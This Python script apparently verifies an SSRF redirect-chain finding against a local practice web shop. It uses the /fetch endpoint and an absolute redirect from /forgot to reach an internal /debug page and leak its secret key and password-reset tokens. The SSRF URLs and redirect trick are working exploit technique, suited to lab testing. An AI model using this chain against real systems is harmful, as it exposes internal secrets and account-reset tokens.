# -*- coding: utf-8 -*-
"""t5 核验 step5：SSRF 出站重定向链条闭合测试（用绝对 Location 的 /forgot<path> 做跳板）
"""
import sys, os, time, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_lib_import import *  # noqa
import verify_lib as V

out = {"step": "step5-ssrf-redirect-chain", "started": time.strftime("%Y-%m-%dT%H:%M:%S%z")}
V.req("GET", "/__reset"); time.sleep(0.25)
out["baseline_sha"] = V.db_snapshot("s5 base")["sha256"]
tok_a, _ = V.login("alice", "alice123")

# 1) /fetch 自己拉 /debug → 未登录（/fetch 的出站请求不带 Cookie）→ 302 相对 Location
direct = V.req("GET", "/fetch?url=http://127.0.0.1:8095/debug", headers=V.cookie(tok_a))
out["direct_debug"] = {"status": direct["status"], "len": direct["len"],
                       "is_error_page": "fetch error" in direct["body_head"],
                       "is_login_page": "请先登录" in direct["body_head"] or "靶场商城 LAB" in direct["body_head"],
                       "body_head": direct["body_head"][:400]}

# 2) /fetch 拉 /forgot<path> → /forgot 用 Host 头构造**绝对** Location
jump = "http://127.0.0.1:8095/forgot%3Fusername=demo/x"
ch1 = V.req("GET", "/fetch?url=" + jump, headers=V.cookie(tok_a))
out["chain_to_debug"] = {
    "url": jump, "status": ch1["status"], "len": ch1["len"],
    "leaked_secret_key": "lab-secret-key-PLEASE-CHANGE-001" in ch1["body_head"],
    "leaked_debug_marker": "&quot;SECRET_KEY&quot;" in ch1["body_head"] or "\"SECRET_KEY\"" in ch1["body_head"],
    "body_head": ch1["body_head"][:700],
}

# 3) 对照：直接请求跳板 URL（外部客户端跟随）
import http.client as hc
c = hc.HTTPConnection("127.0.0.1", 8095, timeout=10)
c.request("GET", "/forgot?username=demo/x")
r = c.getresponse(); r.read()
out["jump_direct"] = {"status": r.status, "location": r.getheader("Location")}
c.close()

# 4) /fetch 直接拉 /forgot（200 内容，证明能读内部页面正文）
f_forgot = V.req("GET", "/fetch?url=http://127.0.0.1:8095/forgot%3Fusername=demo", headers=V.cookie(tok_a))
out["fetch_reads_internal_page"] = {"status": f_forgot["status"], "len": f_forgot["len"],
                                    "has_reset_link": "token=" in f_forgot["body_head"],
                                    "body_head": f_forgot["body_head"][:300]}

# 5) 从 8091 之类跨端口（白名单内）读一下，确认可达范围
f_8091 = V.req("GET", "/fetch?url=http://127.0.0.1:8091/", headers=V.cookie(tok_a))
out["fetch_8091"] = {"status": f_8091["status"], "len": f_8091["len"],
                     "body_head": f_8091["body_head"][:200]}

out["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
V.save("verify-05-ssrf-chain-20261012-1855.json", out)
print(json.dumps({k: v for k, v in out.items() if k not in ("baseline_sha",)}, ensure_ascii=False, indent=1)[:2500])
